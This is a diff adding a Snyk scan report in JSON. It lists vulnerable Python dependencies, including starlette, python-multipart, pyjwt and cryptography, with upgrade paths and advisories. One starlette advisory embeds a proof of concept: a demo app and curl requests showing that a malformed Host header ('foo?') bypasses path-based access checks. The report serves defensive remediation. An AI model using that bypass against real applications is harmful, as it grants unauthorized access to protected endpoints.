@@ -1,0 +1,3352 @@
+{
+  "dependencyCount": 89,
+  "displayTargetFile": "sbom-corrected.cdx.json",
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "hasUnknownVersions": false,
+  "ignoreSettings": {
+    "adminOnly": false,
+    "autoApproveIgnores": false,
+    "disregardFilesystemIgnores": false,
+    "reasonRequired": false
+  },
+  "isPrivate": true,
+  "licensesPolicy": {
+    "orgLicenseRules": null,
+    "severities": null
+  },
+  "ok": false,
+  "org": "feroz-hub",
+  "path": ".",
+  "policy": "",
+  "remediation": {
+    "ignore": null,
+    "pin": {},
+    "unresolved": [],
+    "upgrade": {
+      "cryptography@44.0.0": {
+        "upgradeTo": "cryptography@48.0.1",
+        "upgrades": [
+          "cryptography@44.0.0",
+          "cryptography@44.0.0",
+          "cryptography@44.0.0",
+          "cryptography@44.0.0"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-CRYPTOGRAPHY-15263096",
+          "SNYK-PYTHON-CRYPTOGRAPHY-15809188",
+          "SNYK-PYTHON-CRYPTOGRAPHY-17344551",
+          "SNYK-PYTHON-CRYPTOGRAPHY-8715586"
+        ]
+      },
+      "idna@3.13": {
+        "upgradeTo": "idna@3.15",
+        "upgrades": [
+          "idna@3.13"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-IDNA-16769942"
+        ]
+      },
+      "lxml@5.3.0": {
+        "upgradeTo": "lxml@6.1.0",
+        "upgrades": [
+          "lxml@5.3.0"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-LXML-16119103"
+        ]
+      },
+      "pydantic-settings@2.13.1": {
+        "upgradeTo": "pydantic-settings@2.14.2",
+        "upgrades": [
+          "pydantic-settings@2.13.1"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-PYDANTICSETTINGS-17675228"
+        ]
+      },
+      "pyjwt@2.12.1": {
+        "upgradeTo": "pyjwt@2.13.0",
+        "upgrades": [
+          "pyjwt@2.12.1",
+          "pyjwt@2.12.1",
+          "pyjwt@2.12.1",
+          "pyjwt@2.12.1",
+          "pyjwt@2.12.1"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-PYJWT-17053408",
+          "SNYK-PYTHON-PYJWT-17053409",
+          "SNYK-PYTHON-PYJWT-17054465",
+          "SNYK-PYTHON-PYJWT-17054901",
+          "SNYK-PYTHON-PYJWT-17054902"
+        ]
+      },
+      "python-multipart@0.0.26": {
+        "upgradeTo": "python-multipart@0.0.31",
+        "upgrades": [
+          "python-multipart@0.0.26",
+          "python-multipart@0.0.26",
+          "python-multipart@0.0.26",
+          "python-multipart@0.0.26",
+          "python-multipart@0.0.26"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-PYTHONMULTIPART-16438952",
+          "SNYK-PYTHON-PYTHONMULTIPART-17344732",
+          "SNYK-PYTHON-PYTHONMULTIPART-17345663",
+          "SNYK-PYTHON-PYTHONMULTIPART-17345733",
+          "SNYK-PYTHON-PYTHONMULTIPART-17345735"
+        ]
+      },
+      "starlette@1.0.0": {
+        "upgradeTo": "starlette@1.3.1",
+        "upgrades": [
+          "starlette@1.0.0",
+          "starlette@1.0.0",
+          "starlette@1.0.0",
+          "starlette@1.0.0",
+          "starlette@1.0.0"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-STARLETTE-16881242",
+          "SNYK-PYTHON-STARLETTE-17342498",
+          "SNYK-PYTHON-STARLETTE-17342514",
+          "SNYK-PYTHON-STARLETTE-17342515",
+          "SNYK-PYTHON-STARLETTE-17342519"
+        ]
+      },
+      "urllib3@2.6.3": {
+        "upgradeTo": "urllib3@2.7.0",
+        "upgrades": [
+          "urllib3@2.6.3",
+          "urllib3@2.6.3"
+        ],
+        "vulns": [
+          "SNYK-PYTHON-URLLIB3-16642024",
+          "SNYK-PYTHON-URLLIB3-16642059"
+        ]
+      }
+    }
+  },
+  "summary": "25 vulnerable dependency paths",
+  "targetFile": "sbom-corrected.cdx.json",
+  "uniqueCount": 25,
+  "vulnerabilities": [
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T10:20:16.000000Z",
+      "credit": [
+        "nvn1729"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.8,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.8,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.2,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "## Overview\n[starlette](https://www.pypi.org/project/starlette) is a The little ASGI library that shines.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) in the `StaticFiles` file on Windows systems when handling UNC paths. An attacker can obtain NTLMv2 credentials of the service account by sending a specially crafted request that causes the server to initiate an outbound SMB connection to an attacker-controlled host, resulting in credential disclosure. \n\n**Note:** This is only exploitable if the application is running on Windows and serving static files using the default configuration (`follow_symlink=False`).\n\n## Workaround \n\nThis vulnerability can be mitigated by serving static files through a dedicated web server (such as nginx or IIS) or by blocking outbound SMB (port 445) from the application host.\n## Remediation\nUpgrade `starlette` to version 1.1.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/starlette/security/advisories/GHSA-wqp7-x3pw-xc5r)\n- [GitHub Commit](https://github.com/Kludex/starlette/commit/fd53168a7767b6b55ba5af787fd88f49e33cabc5)\n",
+      "disclosureTime": "2026-06-15T20:16:30.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.28607",
+        "probability": "0.00368"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "1.1.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "starlette@1.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-STARLETTE-17342498",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48818"
+        ],
+        "CWE": [
+          "CWE-918"
+        ],
+        "GHSA": [
+          "GHSA-wqp7-x3pw-xc5r"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-30T14:03:01.000000Z",
+      "name": "starlette",
+      "packageManager": "pip",
+      "packageName": "starlette",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T10:20:16.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-wqp7-x3pw-xc5r"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/starlette/commit/fd53168a7767b6b55ba5af787fd88f49e33cabc5"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,1.1.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Server-side Request Forgery (SSRF)",
+      "upgradePath": [
+        false,
+        "starlette@1.1.0"
+      ],
+      "version": "1.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-27T07:18:21.000000Z",
+      "credit": [
+        "x41j",
+        "Larry Yuan",
+        "Nicolas Lamoureux"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.9,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.9,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n[starlette](https://www.pypi.org/project/starlette) is a The little ASGI library that shines.\n\nAffected versions of this package are vulnerable to HTTP Request Smuggling via the `request.url` reconstruction process. An attacker can bypass path-based security checks by supplying a malformed `Host` header that causes `request.url.path` to differ from the actual requested path.\r\n\r\n**Note:**\r\n\r\nThis is only exploitable if the application relies on `request.url` (or `request.url.path`) for security-sensitive decisions. The most common case is middleware that gates access to certain path prefixes based on `request.url.path`. Deployments fronted by a proxy or load balancer are mitigated only if that proxy rejects or normalizes the malformed Host header before forwarding and the application does not trust attacker-controlled host headers (e.g. `X-Forwarded-Host`) elsewhere.\n## PoC\n```python\r\npip install starlette\r\nfrom starlette.applications import Starlette\r\nfrom starlette.middleware import Middleware\r\nfrom starlette.middleware.base import BaseHTTPMiddleware\r\nfrom starlette.responses import PlainTextResponse\r\nfrom starlette.routing import Route\r\n\r\nclass AuthMiddleware(BaseHTTPMiddleware):\r\n    async def dispatch(self, request, call_next):\r\n        if request.url.path == \"\" or request.url.path == \"/\":\r\n            return await call_next(request)\r\n        return PlainTextResponse(\"Forbidden\\n\", status_code=403)\r\n\r\nasync def root(request):\r\n    return PlainTextResponse(\"Hello World\\n\")\r\nasync def admin(request):\r\n    return PlainTextResponse(\"secret=123\\n\")\r\n\r\nroutes = [\r\n    Route(\"/\", endpoint=root),\r\n    Route(\"/admin\", endpoint=admin),\r\n]\r\n\r\napp = Starlette(routes=routes, middleware=[Middleware(AuthMiddleware)])\r\n```\r\n\r\nThen, start the app using any of the ASGI servers:\r\n\r\n```python\r\npip install {daphne,hypercorn,uvicorn,granian}\r\ndaphne poc:app\r\nhypercorn poc:app\r\nuvicorn poc:app\r\ngranian --interface asgi poc:app\r\n```\r\n\r\nConfirm that the Host header is not validated:\r\n\r\n```python\r\ncurl -i -H 'Host: foo' localhost:8000/admin # 403 Forbidden\r\ncurl -i -H 'Host: foo?' localhost:8000/admin # 200 OK\r\n```\n## Remediation\nUpgrade `starlette` to version 1.0.1 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr)\n- [GitHub Commit](https://github.com/Kludex/starlette/commit/764dab0dcfb9033d75442d7a359645c9f94648c6)\n- [Vulnerability Advisory](https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-48710.yaml)\n",
+      "disclosureTime": "2026-05-27T00:47:39.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.69828",
+        "probability": "0.01438"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Nuclei Templates",
+          "Snyk"
+        ]
+      },
+      "fixedIn": [
+        "1.0.1"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "starlette@1.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-STARLETTE-16881242",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48710"
+        ],
+        "CWE": [
+          "CWE-444"
+        ],
+        "GHSA": [
+          "GHSA-86qp-5c8j-p5mr"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-03T05:02:33.000000Z",
+      "name": "starlette",
+      "packageManager": "pip",
+      "packageName": "starlette",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-27T07:18:21.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/starlette/commit/764dab0dcfb9033d75442d7a359645c9f94648c6"
+        },
+        {
+          "title": "Vulnerability Advisory",
+          "url": "https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette"
+        },
+        {
+          "title": "Nuclei Templates",
+          "url": "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-48710.yaml"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,1.0.1)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "HTTP Request Smuggling",
+      "upgradePath": [
+        false,
+        "starlette@1.0.1"
+      ],
+      "version": "1.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-07T09:59:28.000000Z",
+      "credit": [
+        "SinhSinh An,intadd"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.7,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.7,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n[python-multipart](https://pypi.org/project/python-multipart) is an A streaming multipart parser for Python\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling when parsing multipart headers in `MultipartParser`, which can hang without failing in the following states: `HEADER_FIELD_START`, `HEADER_FIELD`, `HEADER_VALUE_START`, `HEADER_VALUE`, and `HEADER_VALUE_ALMOST_DONE`. An attacker can cause excessive CPU consumption and disrupt service availability by sending requests with either a very large individual header value or numerous repeated headers without terminating the header block.\n## Remediation\nUpgrade `python-multipart` to version 0.0.27 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/python-multipart/security/advisories/GHSA-pp6c-gr5w-3c5g)\n- [GitHub Commit](https://github.com/Kludex/python-multipart/commit/3e64f5f8caba0e5d391b0c1ad0f1c2edf9e8f911)\n",
+      "disclosureTime": "2026-05-06T21:56:14.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.41762",
+        "probability": "0.00549"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "0.0.27"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "python-multipart@0.0.26"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYTHONMULTIPART-16438952",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-42561"
+        ],
+        "CWE": [
+          "CWE-770"
+        ],
+        "GHSA": [
+          "GHSA-pp6c-gr5w-3c5g"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-01T02:01:19.000000Z",
+      "name": "python-multipart",
+      "packageManager": "pip",
+      "packageName": "python-multipart",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-07T09:59:28.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-pp6c-gr5w-3c5g"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/python-multipart/commit/3e64f5f8caba0e5d391b0c1ad0f1c2edf9e8f911"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,0.0.27)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Allocation of Resources Without Limits or Throttling",
+      "upgradePath": [
+        false,
+        "python-multipart@0.0.27"
+      ],
+      "version": "0.0.26"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T14:34:42.000000Z",
+      "credit": [
+        "Ganni Galea Curmi",
+        "Seokhee Chang"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "## Overview\n[python-multipart](https://pypi.org/project/python-multipart) is an A streaming multipart parser for Python\n\nAffected versions of this package are vulnerable to Improper Validation of Specified Quantity in Input in the `parse_form` function when processing a negative `Content-Length` header. An attacker can cause excessive memory usage by sending a crafted request with a negative `Content-Length`, resulting in the entire request body being buffered in memory at once.\n\n**Note:**\n\nThis is only exploitable if the application directly calls `parse_form` with a `Content-Length` header taken from attacker-controlled input and does not normalize negative values first.\n## Remediation\nUpgrade `python-multipart` to version 0.0.31 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/python-multipart/security/advisories/GHSA-v9pg-7xvm-68hf)\n- [GitHub Commit](https://github.com/Kludex/python-multipart/commit/c814948acf509cef7881fa75c969969b19239bbf)\n",
+      "disclosureTime": "2026-06-15T20:23:45.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.11972",
+        "probability": "0.00217"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "0.0.31"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "python-multipart@0.0.26"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYTHONMULTIPART-17345735",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-53540"
+        ],
+        "CWE": [
+          "CWE-1284"
+        ],
+        "GHSA": [
+          "GHSA-v9pg-7xvm-68hf"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:05:47.000000Z",
+      "name": "python-multipart",
+      "packageManager": "pip",
+      "packageName": "python-multipart",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T14:34:42.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-v9pg-7xvm-68hf"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/python-multipart/commit/c814948acf509cef7881fa75c969969b19239bbf"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,0.0.31)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Improper Validation of Specified Quantity in Input",
+      "upgradePath": [
+        false,
+        "python-multipart@0.0.31"
+      ],
+      "version": "0.0.26"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T10:46:25.000000Z",
+      "credit": [
+        "Ethan Kim",
+        "Z-Bra0",
+        "Abdul Moiz",
+        "Moaaz",
+        "SeongHun Pak",
+        "oxqnd"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.7,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.7,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n[starlette](https://www.pypi.org/project/starlette) is a The little ASGI library that shines.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the `request.form`. An attacker can exhaust system resources and disrupt service availability by submitting a specially crafted `application/x-www-form-urlencoded` request containing either an excessive number of fields or a very large field value, leading to event loop blocking or unbounded memory allocation.\n## Remediation\nUpgrade `starlette` to version 1.3.1 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/starlette/security/advisories/GHSA-82w8-qh3p-5jfq)\n- [GitHub Commit](https://github.com/Kludex/starlette/commit/dba1c4babc4f99ad2622bb913d87045775dda735)\n",
+      "disclosureTime": "2026-06-15T20:39:53.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.19040",
+        "probability": "0.00275"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "1.3.1"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "starlette@1.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-STARLETTE-17342515",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-54283"
+        ],
+        "CWE": [
+          "CWE-770"
+        ],
+        "GHSA": [
+          "GHSA-82w8-qh3p-5jfq"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T15:54:16.000000Z",
+      "name": "starlette",
+      "packageManager": "pip",
+      "packageName": "starlette",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-17T13:11:47.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-82w8-qh3p-5jfq"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/starlette/commit/dba1c4babc4f99ad2622bb913d87045775dda735"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[0.4.1,1.3.1)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Allocation of Resources Without Limits or Throttling",
+      "upgradePath": [
+        false,
+        "starlette@1.3.1"
+      ],
+      "version": "1.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-12T08:50:41.000000Z",
+      "credit": [
+        "christos-spearbit"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.2,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.2,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
